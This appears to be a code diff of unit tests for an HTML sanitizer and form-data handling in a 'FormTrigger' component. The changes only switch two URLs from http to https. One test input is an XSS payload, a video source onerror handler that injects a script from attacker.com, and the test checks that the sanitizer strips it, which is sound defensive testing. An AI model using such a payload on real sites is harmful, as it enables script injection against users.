@@ -75,7 +75,7 @@ describe('FormTrigger, sanitizeHtml', () => {
 					'<video controls width="640" height="360"><source type="video/mp4"></source>Fallback text</video>',
 			},
 			{
-				html: "<video><source onerror=\"s=document.createElement('script');s.src='http://attacker.com/evil.js';document.body.appendChild(s);\">",
+				html: "<video><source onerror=\"s=document.createElement('script');s.src='https://attacker.com/evil.js';document.body.appendChild(s);\">",
 				expected: '<video><source></source></video>',
 			},
 			{
@@ -517,7 +517,7 @@ describe('FormTrigger, prepareFormData', () => {
 			query,
 		});
 
-		expect(result.redirectUrl).toBe('http://example.com/thank-you');
+		expect(result.redirectUrl).toBe('https://example.com/thank-you');
 	});
 
 	it('should return invalid form data when formFields are empty', () => {
